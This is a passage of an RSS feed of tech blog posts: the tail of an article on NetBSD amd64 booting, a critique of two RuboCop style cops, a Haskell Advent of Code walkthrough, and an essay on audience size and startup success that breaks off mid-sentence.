<div><pre><code data-lang="bash">$ readelf -h ./netbsd
ELF Header:
  Magic:   7f <span>45</span> 4c <span>46</span> <span>02</span> <span>01</span> <span>01</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> <span>00</span> 
  Class:                             ELF64
  Data:                              <span>2</span><span>'</span>s complement, little endian
  Version:                           <span>1</span> <span>(</span>current<span>)</span>
  OS/ABI:                            UNIX - System V
  ABI Version:                       <span>0</span>
  Type:                              EXEC <span>(</span>Executable file<span>)</span>
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0xffffffff80209000		<span>&lt;&lt;&lt;</span>
  Start of program headers:          <span>64</span> <span>(</span>bytes into file<span>)</span>
  Start of section headers:          <span>219286488</span> <span>(</span>bytes into file<span>)</span>
  Flags:                             0x0
  Size of this header:               <span>64</span> <span>(</span>bytes<span>)</span>
  Size of program headers:           <span>56</span> <span>(</span>bytes<span>)</span>
  Number of program headers:         <span>2</span>
  Size of section headers:           <span>64</span> <span>(</span>bytes<span>)</span>
  Number of section headers:         <span>39</span>
  Section header string table index: <span>37</span></code></pre></div>

<p>We can now check the name of the symbol with such an address, but only if we use non stripped kernel!</p>

<div><pre><code data-lang="bash">$ readelf --syms ./netbsd.gdb | grep ffffffff80209000
 <span>41333</span>: ffffffff80209000    <span>0</span> NOTYPE GLOBAL DEFAULT <span>1</span> __text_user_end
 <span>48452</span>: ffffffff80209000 <span>1096</span> FUNC   GLOBAL DEFAULT <span>1</span> start</code></pre></div>

<p>The starting function for our kernel is <code>start</code>.
Before we look into this function, we need to understand how the CPUâ€™s knows this starting point.
Before the operating system can execute the program, compiled into ELF format, it has to load it into memory.
When the program runs on bare metal (without the operating system), it needs to take care of loading into memory by itself.
This is one of the reasons why we need programs such as bootloaders.</p>

<h2 id="a-few-words-about-bootloaders">A Few Words About Bootloaders</h2>

<p>There are a lot of possible ways and programs we can use to setup our platform.
Different boot loader programs such as <code>grub</code> or <code>u-boot</code> can be configured to work together on various hardware and support operating systems.
Early loader programs provide much flexibility in configuration.
I mentioned earlier two partition schemes: GPT and MBR, both can be used together as a hybrid.
I donâ€™t want go too deeper into disk layout as such a description would end up with multiple tables and descriptions, so I will focus on the NetBSD kernel initialization for the default configuration.</p>

<p>After the BIOS finds a valid sector (with <code>0xAA55</code> signature), it loads the first disk sector (MBR) to physical address <code>0x7c00</code> . It also sets the <code>DL</code> register to drive the number from which MBR was loaded, and after that is done, firmware executes the loaded data.
For the x86 platform, the first two bootloaders are MBR (<code>mbr(8)</code>) and PBR whose names correspond to the sectors where they are placed: Master Boot Record and Partition Boot Record.
Traditionally, the MBR code relocates itself to a different physical memory location (<code>0x600</code>) and then locates the active
partition, reads its first sector (PBR) to the address <code>0x7c00</code> and jumps to it.
The PBR is designed to work with the classical NetBSD chain where it is loaded by the own MBR as well as to work with GPT partition, in both cases there is a difference in behavior.
In the case of GPT the <code>EAX</code> register will contain the constant <code>!GPT</code> (in hex: <code>54504721</code>) and the MBR structure, which contains Logical Block Address (LBA) from which was loaded and some extra information like OS type or GPT partition â€¦</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/">https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/</a></em></p>]]>
            </description>
            <link>https://www.moritz.systems/blog/before-the-bsd-kernel-starts-part-one-on-amd64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25148455</guid>
            <pubDate>Thu, 19 Nov 2020 11:31:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Beef with RuboCop]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 83 (<a href="https://news.ycombinator.com/item?id=25147990">thread link</a>) | @todsacerdoti
<br/>
November 19, 2020 | https://www.rubypigeon.com/posts/my-beef-with-rubocop/ | <a href="https://web.archive.org/web/*/https://www.rubypigeon.com/posts/my-beef-with-rubocop/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Consider a hypothetical class that filters out unsafe HTML elements:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>else</span>
      <span>nil</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>The default RuboCop settings would have us change it to this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>super</span> <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Let us feast on a three-course meal of opinion about why this is
worse.</p>

<h2 id="that-nil-was-written-for-a-purpose">That <code>nil</code> Was Written For A Purpose</h2>

<p>My first beef â€” the hors dâ€™oeuvre, if you will â€” is that
<code>Style/EmptyElse</code> wants us to change from an <em>explicit</em> <code>nil</code> return
value to an <em>implicit</em> one. It says there is a â€œredundant
else-clauseâ€. Iâ€™ll tell you whatâ€™s redundant: the <code>Style/EmptyElse</code>
cop.</p>

<p>This cop would prefer that the <code>else</code> clause did not exist, like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>if</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>
      <span>super</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>In terms of behaviour at runtime, this is exactly the same. In terms
of readability, it is not.</p>

<p>The explicit <code>nil</code> in the original implementation implies that the
method is being called for its return value â€” that itâ€™s probably
functional, with inconsequential side effects.</p>

<p>Making the <code>nil</code> implicit says that <em>the return value is not
important</em>. This method now reads like itâ€™s implemented by avoiding
side effects within <code>super</code>.</p>

<p>So which one is it? Is the filter supposed to work by returning <code>nil</code>,
or does it work by avoiding the side effects in the <code>super</code> call?
These are very different behaviours, and RuboCop just changed the
human interpretation from the correct one to the wrong one.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="its-not-a-guard-clause">Itâ€™s Not A Guard Clause</h2>

<p>My other beef (the main course) is with <code>Style/GuardClause</code>. This cop
takes conditionals and turns one of the branches into a guard clause
â€” something like this:</p>

<div><div><pre><code><span>class</span> <span>SanitizingFilter</span> <span>&lt;</span> <span>HTMLFilter</span>
  <span>def</span> <span>render_element</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>,</span> <span>content</span><span>)</span>
    <span>return</span> <span>nil</span> <span>unless</span> <span>safe?</span><span>(</span><span>name</span><span>,</span> <span>attrs</span><span>)</span>

    <span>super</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Again, the runtime behaviour is identical, but the cop makes it less
readable.</p>

<p>Guard clauses are for bailing out early when you know that itâ€™s not
necessary to run the rest of the method. They are usually trivial in
comparison to the <em>real</em> work done by the rest of the method. For
example, if we were implementing a sorting algorithm, then we could
have a guard clause for inputs with one element or less â€” there is
no need to run a sorting algorithm when there is nothing to sort.</p>

<p>Except in this case, weâ€™re not â€œguardingâ€ the rest of the method from
being run. That conditional is the <em>entire raison dâ€™Ãªtre of the
class</em>. Itâ€™s the most important part. The whole purpose of a filter is
to decide what elements stay in, and what elements get filtered out.</p>

<p>RuboCop has taken the most important part of the class and turned it
into a trivial-looking guard clause.</p>

<p>Bad cop. No doughnut.</p>

<h2 id="branching-should-look-like-branching">Branching Should Look Like Branching</h2>

<p>My final qualm (is there such a thing as dessert beef?) is with
<code>Style/GuardClause</code> removing the obvious indenting of the two
branches, making it look like straight-line procedural code.</p>

<p>Most of the time, developers donâ€™t so much <em>read</em> code as they do
<em>scan</em> code. We donâ€™t read from left to right, top to bottom, as if
the codebase were the worldâ€™s most boring novel. We skim over code,
navigating by the colours of syntax highlighting and the shapes
made by indentation.</p>

<p>So when weâ€™re skimming over the original code, trying to find the
conditional â€” which weâ€™ve already established as being the most
important part of the class â€” we will find two landmarks: a line
that starts with a brightly coloured <code>if</code> keyword, and indentation
that suggests a conditional.</p>

<p>But skimming over the guard-clause-enhanced code we see neither of
these landmarks. Instead, we find indentation that suggests
<em>procedural</em> code: a series of statements that run from top to bottom.
RuboCop has taken an obvious conditional and reshaped it to look like
there is no conditional.</p>

<p>The <code>Style/GuardClause</code> cop is double bad, and misses out on two
doughnuts.</p>

<h2 id="disclaimerconclusion">Disclaimer/Conclusion</h2>

<p>I donâ€™t dislike RuboCop. Itâ€™s well made, and a useful tool.</p>

<p>The problem starts when it is viewed not as a tool, but as a set of
divine commandments. Thou shalt not make implicit <code>nil</code>s explicit.
Thou shalt not write long-form conditionals. Thus saith the RuboCop.</p>

<p>This is not necessarily a problem with RuboCop itself â€” itâ€™s a
problem with how people sometimes use RuboCop. One could argue that
the defaults arenâ€™t great, but they are not a problem until someone
hooks them up to CI.</p>

<p>My only aim here is to disabuse readers of the notion that RuboCop can
only make code better. Itâ€™s a tool, and whether it helps or hurts
depends on how itâ€™s used. Donâ€™t be afraid to disable cops if you canâ€™t
see how they benefit the team.</p>



        

      </div></div>]]>
            </description>
            <link>https://www.rubypigeon.com/posts/my-beef-with-rubocop/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147990</guid>
            <pubDate>Thu, 19 Nov 2020 10:19:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Advent of Code in Haskell: T Minus 16]]>
            </title>
            <description>
<![CDATA[
Score 50 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25147851">thread link</a>) | @todsacerdoti
<br/>
November 19, 2020 | https://www.bulters.dev/posts/t-minus-16/ | <a href="https://web.archive.org/web/*/https://www.bulters.dev/posts/t-minus-16/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
			
<p>For the past few years Iâ€™ve been trying to learn haskell in various ways but
have never been able to stick to the method, let alone actually â€œbecome
productiveâ€ in Haskell.</p>
<p>Since Iâ€™ve decided to spent more time on tinkering during the evenings, I
thought it would be a nice idea to document my learning process.</p>
<p>The general idea is that I will do the challenges from the Advent of Code (2020
edition) and implement them in Haskell. And since there are 16 days left before
â€œit beginsâ€, Iâ€™ll kick off with doing some of the challenges from last year to
prepare.</p>
<p>The documentation part will not really involve the learning of the language
itself, but more on â€œeverything ephemeralâ€ (the plumbing?). Iâ€™ll try to
elaborate on some of the â€œtypical difficult Haskell stuffâ€ as I encounter them
(and when I deem them appropriate).</p>
<p>Iâ€™m convinced that Haskell in itself is quite an easy language to grasp (once
you manage to get â€œsome functional programming practices to clickâ€), but that
there are a number of barriers that prevent people from becoming productive in
it.</p>

<p>During this attempt to grasp Haskell I will be working on my Windows 10 laptop
under WSL2 running an Ubuntu 20.04 installation. My notes will assume that a
sort of sane setup for an editor is available.</p>
<p>I use vim myself, with a fairly minimal vimrc (no haskell specific
configuration) and the following packages:</p>
<div><pre><code data-lang="shell">ale/ coc.nvim/ fzf/ ultisnips/ vim-go/ vim-repeat/ vim-surround/ vim-vinegar/
</code></pre></div><p>To get started I installed the GHC compiler through the default Ubuntu package
manager:</p>
<p>And then verified that installation has succeeded by running</p>
<div><pre><code data-lang="shell">&gt; ghci --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; ghc --version
The Glorious Glasgow Haskell Compilation System, version 8.6.5
&gt; cabal --version
cabal-install version 2.4.0.0
compiled using version 2.4.0.1 of the Cabal library
</code></pre></div><p>This ensured that all binaries are properly available (in path) to get going.</p>

<p>For those who do not know, The Advent of Code (TAOC) is a yearly event in which
50 programming assignments are made available during the first 25 days of
december, outlining a glorious story usually involving santa, elves, presents
and the (not so) daily challenges they face.</p>
<p>Every day two programming challenges are presented that take a certain input
(your daily input file) and require you to do StuffTM with that input to
accomplish a certain task. Donâ€™t worry, it will all become clear when you
actually try this.</p>
<p>You can register on <a href="https://adventofcode.com/">https://adventofcode.com</a>.</p>

<p>With the environment setup I create a fresh directory for the first day:</p>
<p>and paste my input for the first challenge into taoc19/day1/input.txt</p>
<p>Since Iâ€™m not trying to do anything fancy right now, I create a new cabal
package with the <code>cabal init</code> command.  During the interrogation cabal gives
me, I stick with the defaults, except when asked whether Iâ€™m building a package
or executable, in which I choose â€˜executableâ€™.</p>
<p>This gives me a few files that I can use to start building.</p>
<p>To start the process I need to get my data from the input.txt file into a
function. Since Iâ€™ve read something about Haskell before (and some quick
googling) I try using the readFile function (from the stdlib/Prelude) in GHCi
and voila:</p>
<div><pre><code data-lang="haskell"><span>let</span> raw <span>=</span> readFile <span>"input.txt"</span>
</code></pre></div><p>The problem arises when I put the <code>let raw = readFile 'input.txt'</code> line in my
main do-block. Haskell has this notorious Monad thing going on, which I do not
yet fully grasp. But you donâ€™t need to understand it to use it, so a small
Google session quickly led to the insight that I need to â€œreverse arrow putâ€
the result of the <code>readFile</code> call into a variable instead of using <code>let</code>. This
leads to a really minimal Main.hs file</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>
        print raw
</code></pre></div><p>when loadng it into GHCi and running main, it nicely outputs my input data.
First win achieved!</p>
<div><pre><code data-lang="shell">Prelude&gt; :l Main.hs
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
&lt;your data here&gt;
</code></pre></div><p>Step two involves splitting up the input into lines and converting these lines
into an array of integers.</p>
<p>To accomplish the first step, Haskell has a handy function <code>lines</code> (in the
Prelude) available. The second part involves the <code>read</code> function (also a
Prelude thing) and specifying the type of the statement. Initially I created a
separate function <code>stoi</code> for this</p>
<div><pre><code data-lang="haskell"><span>stoi</span> <span>::</span> <span>String</span> <span>-&gt;</span> <span>Int</span>
<span>stoi</span> <span>=</span> rread
</code></pre></div><p>but decided that â€œcastingâ€ the data inline would still be perfectly readable
(and perhaps even clearer), resulting in:</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        print nums
</code></pre></div><p>Achievement 2 unlucked, Iâ€™m finally ready to do something with my data.</p>
<p>Part 1 of the challenge involves calculating how much fuel we need according to
a certain formula, so for every input we apply a function to it, and sum the
results.o</p>
<div><pre><code data-lang="haskell"><span>module</span> Main <span>where</span>

<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> <span>=</span> id <span>-- todo</span>

<span>main</span> <span>::</span> <span>IO</span> ()
<span>main</span> <span>=</span> <span>do</span>
        raw <span>&lt;-</span> readFile <span>"input.txt"</span>

        <span>-- since lines does not take an IO &lt;something&gt; but a regular String</span>
        <span>-- we do not use the do ... &lt;- syntax here, but put it in a variable</span>
        <span>-- directly.</span>
        <span>let</span> ls <span>=</span> lines raw

        <span>-- we want to have an [Int], so map the read function over the lines.</span>
        <span>let</span> nums <span>=</span> map read ls <span>::</span> [<span>Int</span>]

        <span>-- apply the fuelRequired function to all the inputs and sum the result</span>
        <span>let</span> totalFuel <span>=</span> sum <span>$</span> map fuelRequired nums
        print totalFuel
</code></pre></div><p>which if we load it into GHCi gives us the sum of all the weights.</p>
<div><pre><code data-lang="shell">*Main&gt; :edit
<span>[</span><span>1</span> of 1<span>]</span> Compiling Main             <span>(</span> Main.hs, interpreted <span>)</span>
Ok, one module loaded.
*Main&gt; main
<span>9961383</span>
*Main&gt;
</code></pre></div><p>The actual calculation of required fuel involves dividing the weight by 3,
rounding it down and subtracting 2, giving me a really simple to implement
fuelRequired function.</p>
<div><pre><code data-lang="haskell"><span>-- fuelRequired should be the mass x, divided by 3, minus 2</span>
<span>-- with a minimum of 0.</span>
<span>fuelRequired</span> <span>::</span> <span>Int</span> <span>-&gt;</span> <span>Int</span>
<span>fuelRequired</span> x <span>=</span> max <span>0</span> <span>$</span> (div x <span>3</span>) <span>-</span> <span>2</span>
</code></pre></div><p>Running the main file in GHCi again (after reloading the Main.hs file) gives me
a number that, when entered in the answer field on AOC tells me Iâ€™m on the
right track! Yay!</p>

<p>Oh, surprise, physics kicks in. Turns out, fuel weighs something as well, so
weâ€™ll have to calculate the amount of fuel required to carry the fuel, which
also requires fuel to carry, etc.</p>
<p>This looks like a typically recursive situation where fuel that requires no
fuel (i.e. weighing 9 or less) serves as a perfect termination case. Letâ€™s try
to write this as a recursive function with a guard in it.</p>
<div><pre><code data-lang="haskell"><span>-- recursiveFuelRequired is implemented as a recursive function</span>
<span>-- where we terminate recursion as soon as there is no more</span>
<span>-- fuel required for a certain component.</span>
<span>recursiveFuelRequired</span> x
        <span>|</span> x <span>==</span> <span>0</span>    <span>=</span> <span>0</span>
        <span>|</span> otherwise <span>=</span> <span>let</span> thisFuel <span>=</span> fuelRequired x <span>in</span>
                        thisFuel <span>+</span> recursiveFuelRequired thisFuel
</code></pre></div><p>and then calculating the actual total fuel required in the same way as before,
but now with this new recursive function:</p>
<div><pre><code data-lang="haskell"><span>let</span> totalFuel <span>=</span> sum <span>$</span> map recursiveFuelRequired nums
<span>print</span> totalFuel
</code></pre></div><p>output copy-paste into solution field, press submit, andâ€¦ GREAT SUCCESS!</p>
<p>Iâ€™ll cover my solving of the Day 2 challenges somewhere in the upcoming days.</p>

		</section></div>]]>
            </description>
            <link>https://www.bulters.dev/posts/t-minus-16/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25147851</guid>
            <pubDate>Thu, 19 Nov 2020 09:50:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Causality between having a preemptive audience and business success: Case study]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25147734">thread link</a>) | @mxmzb
<br/>
November 19, 2020 | https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study | <a href="https://web.archive.org/web/*/https://maximzubarev.com/causality-between-building-a-preemptive-audience-and-business-success-a-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><p><span><p><em>In for the TLDR? Find the <a href="https://twitter.com/mxmzb/status/1329106639258087428">Twitter thread version here</a>.</em></p><p>A friend of mine is convinced that if you have a lot of followers on an arbitrary social media platform, you are in a much better spot to launch your product than without an audience. He points at people like Gary Vee, and Tai Lopez, implying that they are selling products purely on the back of their popularity. And although he has a point, I think this is extreme cherry-picking. In my opinion, it works for them for specific and unique reasons. </p><p>As I noticed, building an audience <strong>before having a product/service</strong> seems to be an evolving trend, even in the indie maker community. In my effort to find clearness, I've compiled a list of founders and influencers running businesses with differently sized audiences. I hope the examples will shed light on the correlation between large audiences and entrepreneurial success.</p><p>Before we start looking into this: You'll notice that when I write "audience", I <em>usually</em> refer to the Twitter following of a founder. That doesn't mean an audience can't be built on another platform, but it's what most tech founders associate with "audience". </p><p>Further, I will be referring to various sizes of audiences and grades of (routinely presumed) economic success. Those lines are blurry and defined by my intuition of what is what for the average indie maker.</p><h2>Large audience but little to no success</h2><p><em>A large audience in this context leans towards 50k and goes up infinitely. Little to no success means that the project/founder can not self-sustain or the project has died.</em></p><p>You have 50k followers on the platform of your choice. Will you be able to make your next startup successful with that many people behind your back?</p><p><a href="https://twitter.com/tjholowaychuk">TJ Holowaychuk</a> has 47k followers on Twitter (and 44k are occasionally seeing his contributions on GitHub). If you're a developer working with Node.js a lot, there is a good chance you've been using his code, or at least, code impacted by TJ.</p><p>TJ runs a software business called <a href="https://apex.sh/">Apex</a>, which offers monitoring/logging/uptime. I ran across it a few years ago and ever since haven't seen it build up a lot of momentum. Then, two months ago, I found <a href="https://www.indiehackers.com/post/holy-heck-this-is-hard-8ebe864174?commentId=-MF0nsQqF-pLhijfLpgm">a comment by TJ on Indie Hackers</a>:</p><blockquote><p>Congrats! It's definitely tricky, even with my reasonably rare ~50k Twitter community it's still difficult, startups have it so easy in comparison.</p><p>-- <cite>TJ Holowaychuk</cite></p></blockquote><p>Maybe 50k is not enough. How about 2.6m? In May 2019, <a href="https://web.archive.org/web/20190528072150/https://www.instagram.com/arii/">Instagram influencer Arii</a> failed <a href="https://www.tyla.com/news/celebrity-instagram-influencer-with-26m-followers-struggles-to-sell-36-t-shirts-20190528">to sell 36 T-Shirts</a>. The story has been torn apart by media shortly after, with various theories on what had gone wrong. Fake followers, wrong audience, no marketing strategy, lousy product. I'm convinced it's everything except fake followers. Sure, she probably has many, but at 2.5m total, I am confident a few hundred thousand legitimate ones rule this out as the sole reason for failure.</p><p>Do you remember <a href="https://en.wikipedia.org/wiki/Beme">Beme</a>? The social app to <a href="https://www.youtube.com/watch?v=mixsze6uJPg">record videos when you hold it up to your chest</a>? This was an endeavor by Casey Neistat, who had <a href="https://web.archive.org/web/20150809013605/https://www.youtube.com/user/caseyneistat">~1m YouTube subscribers</a>, <a href="https://web.archive.org/web/20150705203923/https://twitter.com/CaseyNeistat">~135k followers on Twitter</a>, and <a href="https://web.archive.org/web/20150813225907/https://instagram.com/caseyneistat/">~400k on Instagram</a> back at the time. Despite accumulating millions of new fans of his own on all platforms ever since and CNN buying Beme in 2016, it eventually shut down in 2018.</p><p>Beme wasn't the only project by Casey that went down. There is also <a href="https://www.368.nyc/about">368</a>, a <em>"place where professional gamers, internet creators and cultural icons meet and create"</em>. Although it is open and operating, it's safe to say it's not what Casey had envisioned for it by far.</p><blockquote><p>[...]<!-- --> building a business is a really slow, really painful process <!-- -->[...]</p><p>-- <cite><a href="https://youtu.be/a49xvHviVds?t=123">Casey Neistat</a></cite></p></blockquote><p>Not convinced yet? Let's reduce the audience down to its purpose: Attention and somewhat targeted reach.</p><p>With this in mind, we can look at the products, which have been spun up and <a href="https://killedbygoogle.com/">eventually killed by yours truly, Google</a>.</p><p>Although Google isn't a person, I think it's a potent example that a social audience isn't tied to a projects' success. Google has millions of followers on all major social media platforms (don't expect me to link the accounts up).</p><p>For emphasis: This is a <a href="https://killedbygoogle.com/">collection of &gt; 200 diverse products</a> by big G itself, an <a href="https://www.theverge.com/2020/1/16/21069458/google-alphabet-trillion-dollar-market-cap-apple-microsoft">ex-1-trillion-net-worth</a> company that made 160 billion in revenue in 2019.</p><p>Each of those products has been likely in development for at least a year, with a dedicated and motivated group of brilliant people working on it. Furthermore, many of those products have been rolled out to Googles' existing audience by integrating them seamlessly into the user experience (Picasa, Google+, Google Reader, Google Video, etc.) or otherwise promoting them with the help of Googles' ecosystem and a bag of serious cash.</p><h2>Medium audience but immense success</h2><p><em>A medium audience in this context ranges from approximately 5-45k. Immense success means that the project is alive and healthy, and the founders can live far beyond their needs, with an ample surplus.</em></p><p>This is a selection of folks with a following that you wouldn't deem overwhelming but still have more to nurture their projects from than the average indie maker. To provide these particular examples significance, I made sure that they had a disproportionate amount of success. I also would like you to pay attention to how their followings became vast <em>after</em> (or should I say <em>while</em>?) building their businesses.</p><p>Probably you didn't expect someone like <a href="https://twitter.com/levelsio">Pieter Levels</a>, who now has an impressive following (currently ~92k on Twitter) and is popular in the industry of online entrepreneurship, to be in this category. However, if you look closely, <a href="https://www.crunchbase.com/organization/remote-ok">at the time Pieter launched RemoteOK</a> in 2015, he <a href="https://web.archive.org/web/20150129205450/https://twitter.com/levelsio">had about 9k followers</a>. I'm not saying that's irrelevant, but I am having trouble to justify <a href="https://remoteok.io/">RemoteOK's</a> success from solely that. <a href="https://www.crunchbase.com/organization/nomad-list">Pieter launched Nomad List</a>, the second startup he is known for, even earlier, in August 2014, when he barely had <a href="https://web.archive.org/web/20140813033726/https://twitter.com/levelsio">4k followers</a> on Twitter. That didn't hinder him to get significant press coverage early on by such as <a href="https://www.inc.com/jessica-stillman/the-best-cities-in-the-world-for-digital-nomads.html">Inc.com</a> or <a href="https://www.businessinsider.in/how-to-find-the-best-places-to-live-when-you-work-remotely/articleshow/39427000.cms">Business Insider India</a>.</p><p><a href="https://twitter.com/yongfook">Jon Yongfook</a> (~18k followers) not only has somewhat of a celebrity status in Singapore, but he also has a noteworthy <a href="https://www.instagram.com/yongfook/">Instagram following</a> (~14k followers). Jon created <a href="https://www.bannerbear.com/">Bannerbear</a> and <a href="https://www.bannerbear.com/open/">discloses his numbers openly</a>. Before Bannerbear, <a href="https://twitter.com/yongfook/status/1304212610204577792">he has "failed"</a> a lot of times, both with <a href="https://twitter.com/yongfook/status/1171311476222464001">zero revenue</a> projects and projects that had <a href="https://blog.yongfook.com/don-t-fail-because-your-marketing-sucks.html">millions raised and hundreds of employees</a>.</p><p><a href="https://twitter.com/shl">Sahil Lavignia</a>, who has accumulated even more followers than Pieter by now (~143k), <a href="https://sahillavingia.com/reflecting">can tell a bizarre story</a> about his company <a href="https://gumroad.com/">Gumroad</a>. He had <a href="https://web.archive.org/web/20120130074352/https://twitter.com/shl">~9k followers</a> when he got funded in the millions around 2011-2012. Although I have been on Twitter at that time I fail to remember how influential numbers like this were back then. In the darkest hours of Gumroad, around November 2015, Sahil had grown his audience to <a href="https://web.archive.org/web/20151129034039/https://twitter.com/shl">~17k followers</a>. Another three years later, in November 2018, he had <a href="https://web.archive.org/web/20180208231910/https://twitter.com/shl">~20k followers</a> when Gumroad slowly <a href="https://sahillavingia.com/reflecting">started to rehabilitate from its prior downturn</a>.</p><p>Nowadays, you can't browse Twitter even for a minute without seeing a Gumroad link popping up somewhere. But Sahil jumped from success to failure and back with each transition taking years and rather moderately growing his Twitter audience. I'd argue his Twitter presence never played a critical role in his business' following success: To this date, his followers presumably view him more as the daily source of wise life advice than as the CEO of Gumroad.</p><h2>Little to no audience but great success</h2><p><em>Little to no audience in this context is everything less than ~5k followers. Great success means that the project is alive and healthy, and the founders can at least sustain their life financially from the project alone. Note that I did not research how many followers the founders in this category had at launch time because they fell into the given range even at the time of writing. But, naturally, you can assume it was even less.</em></p><p>On the other side, there are those who have no large audience and succeeded at their business. These folks are laser-focusing on building their business, not on building an audience for their business.</p><p>Because it's easy to find successful products of founders who don't have a large audience (hint: Look for cool products, the founders are almost always small on social media), here are more examples:</p><p><a href="https://twitter.com/arichaprasad">Richa Prasad</a> (~40 followers) and <a href="https://twitter.com/lucygliang">Lucy Liang</a> (~450 followers) offer online weight loss coaching on <a href="https://www.coachviva.com/">Coach Viva</a> and have recently hit $10k monthly average. I love how they've managed to get a common idea to work <a href="https://www.indiehackers.com/interview/the-long-road-to-10k-in-30-days-414169d6b8">with smart, sequential marketing efforts</a>. For example, they started out with their personal network, made adjustments to the product itself based on feedback, cemented their authenticity with reviews, and eventually landed on <a href="https://www.youtube.com/channel/UCQjOVgcoZvC6-EK0xgankpQ">YouTube</a>.</p><p><a href="https://twitter.com/brettwill1025">Brett Williams</a> is virtually non-existent on social media but has had tremendous success building <a href="https://www.designjoy.co/">designjoy.co</a>), a productized service where he sells web design on a monthly subscription. With that, Brett is <a href="https://www.indiehackers.com/product/hue">reporting to make $26k MRR</a> and has recently crossed <a href="https://www.indiehackers.com/post/hit-400k-as-a-solo-founder-designjoy-update-35af18ab82">$400k in total revenue</a>. The project is about three years old at the time of writing.</p><p><a href="https://twitter.com/sarahhum">Sarah Hum</a> (~4k followers) and <a href="https://twitter.com/a13n">Andrew Rasmussen</a> (~1.5k followers) are the founders of <a href="https://canny.io/">Canny</a>, a crowd-feedback tool used by large brands and tools like <a href="https://ahrefs.canny.io/">ahrefs</a>, <a href="https://react-native.canny.io/feature-requests">React Native</a>, and even <a href="https://netflix.canny.io/">Netflix</a>. Although Canny has <a href="https://www.indiehackers.com/product/canny/1m-arr-milestone--MFew44ybD_39HOGO_N7">recently hit $1m ARR</a>, neither Sarah nor Andrew have an exceptional social media following. <a href="https://canny.io/blog/how-we-built-a-1m-arr-saas-startup/">They found success in strategies</a> like content marketing, cold outreach, and putting effort into a great launch on <a href="https://www.producthunt.com/posts/canny-3">Product Hunt</a>.</p><p><a href="https://twitter.com/linuz90">Fabrizio Rinaldi</a> (~4k followers) and <a href="https://twitter.com/frankdilo">Francesco Di Lorenzo</a> (~2,5k followers) are building <a href="https://mailbrew.com/">Mailbrew</a>, an all-in-one email digest for all your favorite news and updates in one place. Among their popular users are DHH and Chris Coyier, and they have reached <a href="https://www.indiehackers.com/product/mailbrew/revenue">6.5k MRR</a>, which means they have about 800 paying customers.</p><p><a href="https://twitter.com/dannypostmaa">Danny Postma</a> (~4,5k followers) is building <a href="https://headlime.io/">Headlime</a>, a copywriting tool to help you create better headlines. The tool has ~2k votes on Product Hunt and generated $16k in the first 48 hours. Danny is currently <a href="https://twitter.com/dannypostmaa/status/1325993923131568128">working on V2</a> and has almost retreated from social media, which should tell you where his focus is.</p><p><em>I know this section â€¦</em></p></span></p></article></div></div></div>
